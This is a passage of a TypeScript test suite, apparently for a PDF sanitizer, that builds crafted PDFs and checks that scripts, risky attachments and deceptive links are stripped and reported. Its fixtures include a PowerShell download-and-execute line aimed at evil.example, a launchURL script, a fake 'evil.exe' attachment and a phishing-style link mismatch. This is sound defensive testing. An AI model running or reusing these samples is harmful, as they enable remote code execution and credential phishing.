import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { expect } from 'chai';
import {
  bufferSink,
  PdfCategory as C,
  csvPlugin,
  PdfDetail as D,
  type DefuseFinding,
  disarmPdf,
  inspectPdf,
  jsonPlugin,
  type PdfDisarmResult,
  type PdfFinding,
  type PdfOptions,
  passThrough,
  pdfPlugin,
  type ScriptPlugin,
} from '../../src';
import { PdfDocument, TimeLimitError } from '../../src/document';
import { FindingFactory } from '../../src/findings';
import { bufferSource, TempDir } from '../../src/io';
import { decodeTextString, PdfDict, PdfName, type PdfObject, PdfRef, PdfStream, PdfString } from '../../src/objects';
import { Walker } from '../../src/walker';
import { LINK, makeDoc, PdfBuilder } from '../helpers/builder';
import type { Pdfjs, PdfjsAnnotation } from '../helpers/pdfjs';
import { dynamicImport, has, must, passAll, strips } from '../helpers/util';

// Written as a string so this file also builds against a copy of the package from before the detail existed.
const CONTENT_REMOVED = 'CONTENT_REMOVED' as D;
const WORK_LIMIT = 'not checked again: work limit reached';

/**
 * What Mozilla pdf.js offers: document scripts, per page its scripts and annotations, and every attached file.
 * `annotations` false skips reading annotations, which decodes each widget's scripts again.
 */
async function pdfjs(bytes: Uint8Array, annotations = true) {
  const lib = (await dynamicImport('pdfjs-dist/legacy/build/pdf.mjs')) as Pdfjs;
  const task = lib.getDocument({ data: Uint8Array.from(bytes), disableFontFace: true, verbosity: 0, isEvalSupported: false });
  try {
    const doc = await task.promise;
    const files: string[] = [];
    const att = await doc.getAttachments();
    for (const v of att instanceof Map ? att.values() : Object.values(att ?? {})) files.push(v.filename);
    const pages: Array<{ script: boolean; annots: PdfjsAnnotation[] }> = [];
    for (let i = 1; i <= doc.numPages; i++) {
      const page = await doc.getPage(i);
      const annots = annotations ? await page.getAnnotations() : [];
      for (const a of annots) if (a.file) files.push(a.file.filename);
      pages.push({ script: (await page.getJSActions()) !== null, annots });
    }
    return { docScript: (await doc.getJSActions()) !== null, pages, files };
  } finally {
    await task.destroy();
  }
}

/** Keys a rewrite always drops or recomputes, whatever it finds: stream lengths, usage rights and XFA rendering. */
const REWRITE_ONLY = new Set(['Length', 'NeedsRendering', 'UR3', 'UR']);

/** Every key, name value and string reachable from the catalog and the information dictionary, with counts. A null value counts as absent. */
async function reachable(bytes: Uint8Array): Promise<Map<string, number>> {
  const doc = await PdfDocument.open(bufferSource(bytes));
  try {
    const counts = new Map<string, number>();
    const add = (k: string) => counts.set(k, (counts.get(k) ?? 0) + 1);
    const seen = new Set<number>();
    const stack: Array<PdfObject | undefined> = [doc.trailer.get('Root'), doc.trailer.get('Info')];
    while (stack.length) {
      let v = stack.pop();
      if (v instanceof PdfRef) {
        if (seen.has(v.num)) continue;
        seen.add(v.num);
        v = await doc.getObject(v);
      }
      if (Array.isArray(v)) stack.push(...v);
      else if (v instanceof PdfString) add(`string ${decodeTextString(v.bytes)}`);
      else
        for (const [k, x] of (v instanceof PdfStream ? v.dict : v instanceof PdfDict ? v : new PdfDict()).entries()) {
          if (REWRITE_ONLY.has(k) || x === null) continue;
          add(`key ${k}`);
          if (x instanceof PdfName) add(`name ${k} ${x.name}`);
          stack.push(x);
        }
    }
    return counts;
  } finally {
    await doc.release();
  }
}

/** What the walker would write for `pdf`, whatever the verdict. */
async function rewrite(pdf: Uint8Array, options: PdfOptions): Promise<Uint8Array> {
  const doc = await PdfDocument.open(bufferSource(pdf));
  const temp = new TempDir();
  const w = new Walker(doc, { options, depth: 0, temp, factory: new FindingFactory(options.actionOverrides) });
  try {
    await w.analyze();
    const sink = bufferSink();
    await w.write(sink);
    return sink.result();
  } finally {
    await w.cleanup();
    await doc.release();
    await temp.cleanup();
  }
}

/** What a rewrite of `pdf` would lose, as reachable keys, names and strings. */
async function lostInRewrite(pdf: Uint8Array, options: PdfOptions): Promise<string[]> {
  const before = await reachable(pdf);
  const after = await reachable(await rewrite(pdf, options));
  return [...before].filter(([k, n]) => (after.get(k) ?? 0) < n).map(([k]) => k);
}

const formatOnly: ScriptPlugin = { kind: 'script', name: 'format-only', accepts: s => s.trigger === 'field-format', process: async () => ({ result: 'passed' }) };
/** Rewrites every script, differently for each trigger. */
const perTrigger: ScriptPlugin = { kind: 'script', name: 'per-trigger', accepts: () => true, process: async s => ({ result: 'scrubbed', text: `safe("${s.trigger}");` }) };

/** Links sharing one chain of `steps` actions. The first script is one pdf.js reports as the link's address. */
function sharedScriptChain(links: number, steps = 300): Buffer {
  const chain = Array.from(
    { length: steps },
    (_, i) => `<< /S /JavaScript /JS (${i ? `s${i}\\(\\)` : 'app.launchURL\\("https://example.com/s0", true\\)'}) ${i < steps - 1 ? `/Next ${7 + i} 0 R` : ''} >>`,
  );
  return makeDoc({ objects: chain, annots: Array.from({ length: links }, (_, i) => LINK('6 0 R', `[${i % 500} 0 ${(i % 500) + 1} 1]`)) }).pdf;
}

/**
 * Links sharing one chain of web links, each link with `tooltip` as an indirect string when given. `heads` 'inline'
 * starts every link with an inline web link whose /Next joins the chain, and 'distinct' writes the tooltip into every
 * link with a suffix of its own.
 */
function sharedUriChain(links: number, steps: number, tooltip?: string, heads: 'shared' | 'inline' | 'distinct' = 'shared'): Buffer {
  const b = new PdfBuilder();
  const catalog = b.reserve();
  const pages = b.reserve();
  const page = b.reserve();
  const font = b.add('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>');
  const content = b.add({ dict: '<< >>', stream: 'BT /F1 24 Tf 72 720 Td (Hello) Tj ET', deflate: true });
  const tip = tooltip === undefined || heads === 'distinct' ? 0 : b.add(`(${tooltip})`);
  const first = b.reserve();
  let cur = first;
  for (let i = 0; i < steps; i++) {
    const next = i + 1 < steps ? b.reserve() : 0;
    b.set(cur, `<< /S /URI /URI (https://example.com/${i}) ${next ? `/Next ${next} 0 R` : ''} >>`);
    cur = next;
  }
  const annots = Array.from({ length: links }, (_, i) => {
    const label = heads === 'distinct' && tooltip !== undefined ? `/Contents (${tooltip} n${i})` : tip ? `/Contents ${tip} 0 R` : '';
    const a = heads === 'inline' ? `<< /S /URI /URI (https://example.com/h${i}) /Next ${first} 0 R >>` : `${first} 0 R`;
    return b.add(`<< /Type /Annot /Subtype /Link /Rect [${i % 500} ${i % 700} ${(i % 500) + 1} ${(i % 700) + 1}] ${label} /A ${a} >>`);
  });
  b.set(catalog, `<< /Type /Catalog /Pages ${pages} 0 R >>`);
  b.set(pages, `<< /Type /Pages /Kids [${page} 0 R] /Count 1 /MediaBox [0 0 612 792] >>`);
  b.set(page, `<< /Type /Page /Parent ${pages} 0 R /Resources << /Font << /F1 ${font} 0 R >> >> /Contents ${content} 0 R /Annots [${annots.map(n => `${n} 0 R`).join(' ')}] >>`);
  b.root = catalog;
  return b.build();
}

/**
 * Form fields and the page's open trigger sharing one script action: a chain of `steps` scripts, or one script of
 * `bytes` bytes. Asking again for each slot runs out of budget either way.
 */
function sharedFormScript(fields: number, shape: { steps: number } | { bytes: number }): Buffer {
  const b = new PdfBuilder();
  const catalog = b.reserve();
  const pages = b.reserve();
  const page = b.reserve();
  const font = b.add('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>');
  const content = b.add({ dict: '<< >>', stream: 'BT /F1 24 Tf 72 720 Td (Hello) Tj ET', deflate: true });
  const action = b.reserve();
  if ('bytes' in shape) b.set(action, `<< /S /JavaScript /JS ${b.add({ dict: '<< >>', stream: `app.alert("hi");${' '.repeat(shape.bytes - 16)}`, deflate: true })} 0 R >>`);
  else
    for (let i = 0, cur = action; i < shape.steps; i++) {
      const next = i + 1 < shape.steps ? b.reserve() : 0;
      b.set(cur, `<< /S /JavaScript /JS (s${i}\\(\\)) ${next ? `/Next ${next} 0 R` : ''} >>`);
      cur = next;
    }
  const widgets = Array.from({ length: fields }, (_, i) => b.add(`<< /Type /Annot /Subtype /Widget /FT /Tx /T (f${i}) /Rect [10 ${10 + i} 20 ${11 + i}] /P ${page} 0 R /AA << /F ${action} 0 R >> >>`));
  const refs = widgets.map(w => `${w} 0 R`).join(' ');
  b.set(catalog, `<< /Type /Catalog /AcroForm << /Fields [${refs}] /DA (/Helv 0 Tf 0 g) >> /Pages ${pages} 0 R >>`);
  b.set(pages, `<< /Type /Pages /Kids [${page} 0 R] /Count 1 /MediaBox [0 0 612 792] >>`);
  b.set(page, `<< /Type /Page /Parent ${pages} 0 R /Resources << /Font << /F1 ${font} 0 R >> >> /Contents ${content} 0 R /Annots [${refs}] /AA << /O ${action} 0 R >> >>`);
  b.root = catalog;
  return b.build();
}

/** A field format trigger and the page's open trigger sharing one script. */
const sharedFieldAndPage = () =>
  makeDoc({
    catalog: '/AcroForm << /Fields [7 0 R] >>',
    page: '/AA << /O 6 0 R >>',
    objects: ['<< /S /JavaScript /JS (app.launchURL\\("https://evil.example/"\\)) >>'],
    annots: ['<< /Type /Annot /Subtype /Widget /FT /Tx /T (Total) /Rect [0 0 50 20] /AA << /F 6 0 R >> >>'],
  }).pdf;

/** A CSV stream behind two names. */
const twoNames = (second: string) =>
  makeDoc({
    catalog: `/Names << /EmbeddedFiles << /Names [(report.csv) 7 0 R (${second}) 8 0 R] >> >>`,
    objects: [
      // No declared type, so csvPlugin goes by each name's extension.
      { dict: '<< /Type /EmbeddedFile >>', stream: 'powershell -c iex(irm https://evil.example/x)\r\n' },
      '<< /Type /Filespec /F (report.csv) /UF (report.csv) /EF << /F 6 0 R >> >>',
      `<< /Type /Filespec /F (${second}) /UF (${second}) /EF << /F 6 0 R >> >>`,
    ],
  }).pdf;

/** An executable reached through a FileAttachment whose /FS also reads as a link annotation. */
const fileSpecLikeLink = () =>
  makeDoc({
    objects: [{ dict: '<< >>', stream: 'MZ\x90\x00 pretend executable' }, '<< /Type /Filespec /Subtype /Link /Rect [0 0 0 0] /F (evil.exe) /UF (evil.exe) /EF << /F 6 0 R >> >>'],
    annots: ['<< /Type /Annot /Subtype /FileAttachment /Rect [72 600 92 620] /FS 7 0 R /Contents (open me) >>'],
  }).pdf;

/** An attachment that the document script tree also names, ahead of the attachment tree. */
const attachmentInScriptTree = () =>
  makeDoc({
    catalog: '/Foo 6 0 R /Names << /JavaScript 8 0 R /EmbeddedFiles 9 0 R >>',
    objects: [
      { dict: '<< >>', stream: 'MZ pretend executable' },
      '<< /Type /Filespec /F (evil.exe) /UF (evil.exe) /EF << /F 6 0 R >> >>',
      '<< /Names [(a) 7 0 R] >>',
      '<< /Names [(evil.exe) 7 0 R] >>',
    ],
  }).pdf;

/** Page 2 is written directly in /Kids and holds a link dictionary covering the whole page. */
function inlinePageLink(): Buffer {
  const b = new PdfBuilder();
  const catalog = b.reserve();
  const pages = b.reserve();
  const page = b.reserve();
  const font = b.add('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>');
  const c1 = b.add({ dict: '<< >>', stream: 'BT /F1 24 Tf 72 720 Td (Hello) Tj ET' });
  const c2 = b.add({ dict: '<< >>', stream: 'BT /F1 24 Tf 72 720 Td (Inline) Tj ET' });
  const res = `/Resources << /Font << /F1 ${font} 0 R >> >>`;
  b.set(page, `<< /Type /Page /Parent ${pages} 0 R ${res} /Contents ${c1} 0 R >>`);
  const link = LINK('<< /S /URI /URI (https://example.com/) >>', '[0 0 612 792]');
  b.set(pages, `<< /Type /Pages /Kids [${page} 0 R << /Type /Page /Parent ${pages} 0 R ${res} /Contents ${c2} 0 R /Annots [${link}] >>] /Count 2 /MediaBox [0 0 612 792] >>`);
  b.set(catalog, `<< /Type /Catalog /Pages ${pages} 0 R >>`);
  b.root = catalog;
  return b.build();
}

const attach = (name: string, mime: string, body: string) =>
  makeDoc({
    catalog: `/Names << /EmbeddedFiles << /Names [(${name}) 6 0 R] >> >>`,
    objects: [`<< /Type /Filespec /F (${name}) /UF (${name}) /EF << /F 7 0 R >> >>`, { dict: `<< /Type /EmbeddedFile /Subtype /${mime.replace('/', '#2F')} >>`, stream: body }],
  }).pdf;

describe('review: round 2 (walker and engine)', function () {
  this.timeout(300000);

  describe('a removal always leaves the upload strippable', () => {
    it('makes the upload strippable when the walk removes content no finding reports', async () => {
      type Emit = (this: { cfg: { factory: FindingFactory } }, category: C, detail: D, location?: string, data?: Record<string, string | number>) => PdfFinding;
      const proto = Walker.prototype as unknown as { emit: Emit };
      const emit = proto.emit;
      // A rule that removes a full-page link but forgets to record its finding.
      proto.emit = function (this: { cfg: { factory: FindingFactory } }, category: C, detail: D, location?: string, data?: Record<string, string | number>) {
        return detail === D.FullPage ? this.cfg.factory.make(category, detail, location, data) : emit.call(this, category, detail, location, data);
      };
      try {
        const pdf = makeDoc({ annots: [LINK('<< /S /URI /URI (https://example.com/) >>', '[0 0 612 792]')] }).pdf;
        const seen: Record<string, unknown> = {};
        for (const [k, actionOverrides] of [
          ['default', []],
          ['override', [{ category: C.Processing, detail: CONTENT_REMOVED, action: 'info' as const }]],
        ] as const) {
          const r = await disarmPdf(pdf, { actionOverrides: [...actionOverrides] });
          const net = r.before.findings.find(f => f.detail === CONTENT_REMOVED);
          seen[k] = { status: r.status, net: net?.action, links: r.bytes ? (await pdfjs(r.bytes)).pages[0].annots.length : null };
        }
        expect(seen).to.deep.equal({ default: { status: 'defused', net: 'strip', links: 0 }, override: { status: 'defused', net: 'strip', links: 0 } });
      } finally {
        proto.emit = emit;
      }
    });

    it('reports every removal with a finding of its own, so a clean verdict always means nothing would be removed', async () => {
      const fileAttachment = (spec: string) => `<< /Type /Annot /Subtype /FileAttachment /Rect [72 600 92 620] ${spec} >>`;
      const objStm = new PdfBuilder();
      // Objects 1 to 3 go into object stream 5.
      objStm.set(1, '<< /Type /Catalog /Pages 2 0 R /Foo 5 0 R >>');
      objStm.set(2, '<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 612 792] >>');
      objStm.set(3, '<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>');
      objStm.set(4, { dict: '<< >>', stream: 'BT ET' });
      objStm.root = 1;
      const cases: Record<string, { pdf: Buffer; options?: PdfOptions }> = {
        clean: { pdf: makeDoc().pdf },
        rewriteOnly: {
          pdf: makeDoc({ catalog: '/NeedsRendering true /Perms << /UR3 6 0 R /DocMDP 7 0 R >>', objects: ['<< /Type /Sig /Filter /Adobe.PPKLite >>', '<< /Type /Sig /Filter /Adobe.PPKLite >>'] }).pdf,
        },
        scriptChainPastBudget: { pdf: sharedScriptChain(60), options: { scriptPlugins: [passAll] } },
        uriChainShared: { pdf: sharedUriChain(70, 255) },
        rewrittenPerTrigger: { pdf: sharedFieldAndPage(), options: { scriptPlugins: [perTrigger] } },
        fileSpecLikeLink: { pdf: fileSpecLikeLink() },
        secondName: { pdf: twoNames('run.bat'), options: { filePlugins: [csvPlugin()] } },
        attachmentInScriptTree: { pdf: attachmentInScriptTree() },
        nullFileSpec: { pdf: makeDoc({ annots: [fileAttachment('/FS null')] }).pdf },
        noFileSpec: { pdf: makeDoc({ annots: [fileAttachment('')] }).pdf },
        associatedNumber: { pdf: makeDoc({ catalog: '/AF [5]' }).pdf },
        attachmentTreeNumber: { pdf: makeDoc({ catalog: '/Names << /EmbeddedFiles << /Names [(a) 5] >> >>' }).pdf },
        actionsNotDictionary: { pdf: makeDoc({ page: '/AA [1 2]' }).pdf },
        actionsEmpty: { pdf: makeDoc({ page: '/AA << >>', annots: ['<< /Type /Annot /Subtype /Text /Rect [0 0 10 10] /AA << /E null >> >>'] }).pdf },
        wrongTypes: { pdf: makeDoc({ catalog: '/Names 5 /Perms 6 /AcroForm << /Fields 7 /DA (/Helv 0 Tf 0 g) >>' }).pdf },
        relatedFiles: {
          pdf: makeDoc({
            catalog: '/Names << /EmbeddedFiles << /Names [(a.txt) 7 0 R] >> >>',
            objects: [
              { dict: '<< /Type /EmbeddedFile /Subtype /text#2Fplain >>', stream: 'hello' },
              '<< /Type /Filespec /F (a.txt) /UF (a.txt) /EF << /F 6 0 R /DOS (x) >> /RF << /F [(b.txt) 6 0 R] >> >>',
            ],
          }).pdf,
          options: { filePlugins: [passThrough(['text/plain'])] },
        },
        embeddedNotStream: {
          pdf: makeDoc({ catalog: '/Names << /EmbeddedFiles << /Names [(a.txt) 6 0 R] >> >>', objects: ['<< /Type /Filespec /F (a.txt) /EF << /F 7 0 R >> >>', '<< /Not (a stream) >>'] }).pdf,
        },
        emptyNext: { pdf: makeDoc({ annots: [LINK('<< /S /URI /URI (https://example.com/) /Next [] >>')] }).pdf },
        objectStreamReference: { pdf: objStm.build({ xref: 'stream', objectStreams: true }) },
        removedByPlugin: {
          pdf: attach('a.csv', 'text/csv', '=1+1\r\n'),
          options: { filePlugins: [csvPlugin({ formulas: 'remove' })], actionOverrides: [{ category: C.EmbeddedFile, detail: D.PluginRemoved, action: 'info' }] },
        },
        mismatchNoPlugin: {
          pdf: attach('a.pdf', 'application/pdf', 'not a pdf'),
          options: {
            filePlugins: [jsonPlugin()],
            actionOverrides: [
              { category: C.EmbeddedFile, detail: D.TypeMismatch, action: 'info' },
              { category: C.EmbeddedFile, detail: D.NoPlugin, action: 'info' },
            ],
          },
        },
        inlinePageLink: { pdf: inlinePageLink() },
        // Name-tree keys that are not strings, which pdf.js reads all the same.
        scriptTreeNumberKey: { pdf: makeDoc({ catalog: '/Names << /JavaScript << /Names [1 << /S /JavaScript /JS (app.alert\\(1\\)) >>] >> >>' }).pdf, options: { scriptPlugins: [passAll] } },
        attachmentTreeNumberKey: {
          pdf: makeDoc({
            catalog: '/Names << /EmbeddedFiles << /Names [true 6 0 R] >> >>',
            objects: ['<< /Type /Filespec /F (a.txt) /UF (a.txt) /EF << /F 7 0 R >> >>', { dict: '<< /Type /EmbeddedFile /Subtype /text#2Fplain >>', stream: 'hello' }],
          }).pdf,
          options: { filePlugins: [passThrough(['text/plain'])] },
        },
      };
      // Every category reduced to info, so only removals made whatever the overrides say are left.
      const allInfo = Object.values(C).map(category => ({ category, action: 'info' as const }));
      // What pdf.js offers of a file: scripts, attachments and annotations. A file it cannot read counts as one view.
      const view = async (bytes: Uint8Array) =>
        pdfjs(bytes).then(
          v => JSON.stringify({ docScript: v.docScript, files: [...v.files].sort(), pages: v.pages.map(p => ({ script: p.script, annots: p.annots.length })) }),
          () => 'unreadable',
        );
      const failures: Record<string, unknown> = {};
      for (const [name, { pdf, options = {} }] of Object.entries(cases)) {
        const runs: Array<[string, PdfOptions]> = [
          ['default', options],
          ['all info', { ...options, actionOverrides: [...(options.actionOverrides ?? []), ...allInfo] }],
        ];
        for (const [mode, opts] of runs) {
          const r = await disarmPdf(pdf, opts);
          const unnamed = r.before.findings.some(f => f.detail === CONTENT_REMOVED);
          const lost = r.status === 'clean' ? await lostInRewrite(pdf, opts) : [];
          // A second parser must see the same in the upload and in what a rewrite of it would hold.
          const pdfjsLost = r.status === 'clean' && (await view(pdf)) !== (await view(await rewrite(pdf, opts)));
          if (unnamed || lost.length || pdfjsLost) failures[`${name}, ${mode}`] = { status: r.status, unnamed, lost: lost.slice(0, 5), pdfjsLost };
        }
      }
      expect(failures).to.deep.equal({});
    });
  });

  describe('shared scripts asked about again', () => {
    it('removes, and reports, each slot refused once the work budget runs out', async () => {
      const refused = (findings: DefuseFinding[]) => findings.filter(f => f.action === 'strip' && f.data?.reason === WORK_LIMIT).map(f => f.location);
      const named = (fields: Array<string | undefined>) => [...fields.map(n => `field "${n}" on page 1 field-format trigger`), 'page 1 page-open trigger'];
      // A chain of 300 scripts: the plugin keeps it for formatting, and the page's open trigger comes last.
      const chain = await disarmPdf(sharedFormScript(60, { steps: 300 }), { scriptPlugins: [formatOnly] });
      const view = await pdfjs(must(chain.bytes, 'output bytes'));
      const without = view.pages[0].annots.filter(a => a.actions == null).map(a => a.fieldName);
      // One script of 7 MiB. pdf.js would decode it again for every widget, so the widgets are read here.
      const long = await disarmPdf(sharedFormScript(40, { bytes: 7 * 1024 * 1024 }), { scriptPlugins: [formatOnly] });
      const out = await PdfDocument.open(bufferSource(must(long.bytes, 'output bytes')));
      const longWithout: string[] = [];
      try {
        for (const num of Array.from(out.liveNumbers())) {
          const o = await out.getObject(new PdfRef(num, 0));
          if (o instanceof PdfDict && o.name('Subtype') === 'Widget' && !o.has('AA')) longWithout.push(decodeTextString((o.get('T') as PdfString).bytes));
        }
      } finally {
        await out.release();
      }
      expect({
        chain: { status: chain.status, pageScript: view.pages[0].script, some: without.length > 0 && without.length < 60, refused: refused(chain.before.findings) },
        long: { status: long.status, pageScript: (await pdfjs(must(long.bytes, 'output bytes'), false)).pages[0].script, refused: refused(long.before.findings) },
      }).to.deep.equal({
        chain: { status: 'defused', pageScript: false, some: true, refused: named(without) },
        long: { status: 'defused', pageScript: false, refused: named(longWithout) },
      });
      expect(longWithout).to.deep.equal(['f38', 'f39']);
    });

    it('reports a slot refused because a plugin rewrote the shared script differently for it', async () => {
      const r = await disarmPdf(sharedFieldAndPage(), { scriptPlugins: [perTrigger] });
      const view = await pdfjs(must(r.bytes, 'output bytes'));
      const page = r.before.findings.filter(f => f.action === 'strip' && f.category === C.JavaScript && f.location === 'page 1 page-open trigger');
      expect({ status: r.status, pageScript: view.pages[0].script, widgetScript: view.pages[0].annots[0]?.actions != null, reported: page.length > 0 }).to.deep.equal({
        status: 'defused',
        pageScript: false,
        widgetScript: true,
        reported: true,
      });
    });

    it('does not ask again for a shared chain with no script in it, so its links keep their actions', async () => {
      const pdf = sharedUriChain(70, 255);
      const r = await disarmPdf(pdf);
      // A rewrite keeps every link's action too, so nothing was dropped behind the clean verdict.
      expect({ status: r.status, refused: r.before.findings.filter(f => f.data?.reason === WORK_LIMIT).length, lost: await lostInRewrite(pdf, {}) }).to.deep.equal({
        status: 'clean',
        refused: 0,
        lost: [],
      });
    });
  });

  it('gives a count of findings past the first 200 of a kind the action of what it counts', async () => {
    const pdf = makeDoc({ annots: Array.from({ length: 250 }, (_, i) => LINK(`<< /S /JavaScript /JS (s${i}\\(\\)) >>`, `[${i % 500} 0 ${(i % 500) + 1} 1]`)) }).pdf;
    const kept = await disarmPdf(pdf, { scriptPlugins: [passAll] });
    const removed = await inspectPdf(pdf);
    const more = (findings: DefuseFinding[]) => findings.find(f => f.detail === D.Link && f.location === 'additional occurrences');
    // A clean file is rewritten too, so its bytes change.
    expect({
      kept: {
        status: kept.status,
        action: more(kept.before.findings)?.action,
        count: more(kept.before.findings)?.data?.count,
        same: Buffer.compare(Buffer.from(must(kept.bytes, 'output bytes')), pdf) === 0,
      },
      removed: { status: removed.status, action: more(removed.findings)?.action, count: more(removed.findings)?.data?.count },
    }).to.deep.equal({ kept: { status: 'clean', action: 'info', count: 50, same: false }, removed: { status: 'strippable', action: 'strip', count: 50 } });
  });

  it('checks every further name of a kept file with the plugin that decided it', async () => {
    const bat = await disarmPdf(twoNames('run.bat'), { filePlugins: [csvPlugin()] });
    const csv = await disarmPdf(twoNames('copy.csv'), { filePlugins: [csvPlugin()] });
    expect({
      bat: { status: bat.status, files: (await pdfjs(must(bat.bytes, 'output bytes'))).files, removed: strips(bat.before.findings, D.NoPlugin).map(f => f.data?.name) },
      csv: { status: csv.status, files: (await pdfjs(must(csv.bytes, 'output bytes'))).files.sort() },
    }).to.deep.equal({ bat: { status: 'defused', files: ['report.csv'], removed: ['run.bat'] }, csv: { status: 'clean', files: ['copy.csv', 'report.csv'] } });
  });

  it('checks the labels of many links sharing one long chain in time', async () => {
    const tooltip = 'see example.com '.repeat(256).slice(0, 4096);
    const r = await inspectPdf(sharedUriChain(1000, 255, tooltip), { limits: { timeMs: 5000 } });
    // A label naming hundreds of sites with the link's own last, on links that each start with an inline action
    // joining the chain, or that each have a label of their own. 254 steps after an inline head is the longest chain checked.
    let wide = '';
    for (let i = 0; wide.length < 4080; i++) wide += `a${i}.co `;
    wide = `${wide.slice(0, wide.lastIndexOf(' ', 4096 - 17))} example.com`;
    const timed: Record<string, string> = {};
    for (const [heads, steps] of [
      ['inline', 254],
      ['distinct', 255],
    ] as const)
      timed[heads] = (await inspectPdf(sharedUriChain(1000, steps, wide, heads), { limits: { timeMs: 5000 } })).status;
    // The outcome is kept per chain and label, so a link with another label on the same chain is still checked.
    const b = new PdfBuilder();
    b.set(1, '<< /Type /Catalog /Pages 2 0 R >>');
    b.set(2, '<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 612 792] >>');
    b.set(3, '<< /Type /Page /Parent 2 0 R /Contents 4 0 R /Annots [7 0 R 8 0 R 9 0 R] >>');
    b.set(4, { dict: '<< >>', stream: 'BT ET' });
    b.set(5, '<< /S /URI /URI (https://www.mybank.example/) /Next 6 0 R >>');
    b.set(6, '<< /S /URI /URI (https://evil.example/login) >>');
    for (const [n, tip] of [
      [7, 'Sign in at www.mybank.example or evil.example'],
      [8, 'Sign in at www.mybank.example'],
      [9, 'Sign in at www.mybank.example or evil.example'],
    ] as const)
      b.set(n, `<< /Type /Annot /Subtype /Link /Rect [0 ${n} 10 ${n + 1}] /Contents (${tip}) /A 5 0 R >>`);
    b.root = 1;
    const mixed = await inspectPdf(b.build());
    expect({
      status: r.status,
      timed,
      mismatch: strips(mixed.findings, D.TextMismatch).map(f => f.location),
    }).to.deep.equal({ status: 'clean', timed: { inline: 'clean', distinct: 'clean' }, mismatch: ['page 1, annotation 2'] });
  });

  it('measures a link on a page written directly in /Kids against that page', async () => {
    const r = await disarmPdf(inlinePageLink());
    expect({ status: r.status, full: strips(r.before.findings, D.FullPage).map(f => f.location), links: r.bytes ? (await pdfjs(r.bytes)).pages[1].annots.length : null }).to.deep.equal({
      status: 'defused',
      full: ['page 2, annotation 1'],
      links: 0,
    });
  });

  it('decides the file of a file specification that also reads as an annotation', async () => {
    const r = await disarmPdf(fileSpecLikeLink());
    const view = await pdfjs(must(r.bytes, 'output bytes'));
    expect({ status: r.status, removed: strips(r.before.findings, D.NoPlugin).map(f => f.data?.name), files: view.files }).to.deep.equal({ status: 'defused', removed: ['evil.exe'], files: [] });
  });

  it('lets a real visit report and decide what a visit of removed content saw first', async () => {
    const seen: Record<string, unknown> = {};
    for (const [k, actionOverrides] of [
      ['default', []],
      ['malformed kept', [{ category: C.Corrupted, detail: D.MalformedObject, action: 'info' as const }]],
    ] as const) {
      const r = await disarmPdf(attachmentInScriptTree(), { actionOverrides: [...actionOverrides] });
      seen[k] = { status: r.status, removed: strips(r.before.findings, D.NoPlugin).map(f => f.data?.name), files: r.bytes ? (await pdfjs(r.bytes)).files : null };
    }
    const gone = { status: 'defused', removed: ['evil.exe'], files: [] };
    expect(seen).to.deep.equal({ default: gone, 'malformed kept': gone });
  });

  describe('page content signature', () => {
    it('sums a /Contents array shared by many pages once', async () => {
      const b = new PdfBuilder();
      const catalog = b.reserve();
      const pages = b.reserve();
      const cs = b.add({ dict: '<< >>', stream: 'q Q' });
      const arr = b.add(`[${new Array(20000).fill(`${cs} 0 R`).join(' ')}]`);
      const kids = Array.from({ length: 400 }, () => b.add(`<< /Type /Page /Parent ${pages} 0 R /Contents ${arr} 0 R >>`));
      b.set(catalog, `<< /Type /Catalog /Pages ${pages} 0 R >>`);
      b.set(pages, `<< /Type /Pages /Kids [${kids.map(k => `${k} 0 R`).join(' ')}] /Count 400 /MediaBox [0 0 612 792] >>`);
      b.root = catalog;
      const r = await inspectPdf(b.build(), { limits: { timeMs: 2000 } });
      expect({ status: r.status, time: has(r, C.Limit, D.Time) }).to.deep.equal({ status: 'clean', time: false });
    });

    it('checks the time limit while it sums', async () => {
      const b = new PdfBuilder();
      b.set(1, '<< /Type /Catalog /Pages 2 0 R >>');
      b.set(2, '<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 612 792] >>');
      b.set(3, '<< /Type /Page /Parent 2 0 R /Contents [4 0 R 5 0 R 6 0 R] >>');
      for (const n of [4, 5, 6]) b.set(n, { dict: '<< >>', stream: 'q Q' });
      b.root = 1;
      const doc = await PdfDocument.open(bufferSource(b.build()), { deadline: Date.now() + 60000 });
      const temp = new TempDir();
      const w = new Walker(doc, { options: {}, depth: 0, temp, factory: new FindingFactory() });
      let error: unknown;
      let measured = 0;
      try {
        await w.analyze();
        // The deadline passes while the first stream of the page is measured, after the check for the page, so only
        // the check made for each stream can stop the sum.
        const plainLength = doc.plainLength;
        doc.plainLength = async (...args) => {
          measured++;
          (doc as unknown as { opts: { deadline?: number } }).opts.deadline = Date.now() - 1;
          return plainLength.apply(doc, args);
        };
        await w.contentSignature().catch(e => {
          error = e;
        });
      } finally {
        await w.cleanup();
        await doc.release();
        await temp.cleanup();
      }
      expect({ error: error instanceof TimeLimitError, measured }).to.deep.equal({ error: true, measured: 1 });
    });
  });

  it('fails the upload with an I/O error from an attached PDF run, as with its own', async () => {
    const fspm: typeof import('node:fs/promises') = require('node:fs/promises');
    const inner = makeDoc({ catalog: '/OpenAction << /S /JavaScript /JS (app.alert\\(1\\)) >>' }).pdf;
    const outer = makeDoc({
      catalog: '/Names << /EmbeddedFiles << /Names [(inner.pdf) 7 0 R] >> >>',
      objects: [{ dict: '<< /Type /EmbeddedFile /Subtype /application#2Fpdf >>', stream: inner }, '<< /Type /Filespec /F (inner.pdf) /UF (inner.pdf) /EF << /F 6 0 R >> >>'],
    }).pdf;
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pdf-defuse-round2-'));
    const real = fspm.open;
    let struck = 0;
    // The first output file opened is the attached PDF's, since the upload's own is written after the walk.
    fspm.open = (async (file: fs.PathLike, flags?: string | number, mode?: fs.Mode) => {
      if (!struck && flags === 'w' && String(file).endsWith('.pdf')) {
        struck++;
        throw Object.assign(new Error('EIO: injected'), { code: 'EIO' });
      }
      return real(file, flags, mode);
    }) as typeof real;
    try {
      let error: unknown;
      const r = await disarmPdf(outer, { filePlugins: [pdfPlugin()], tempDir: dir }).catch(e => {
        error = e;
        return e;
      });
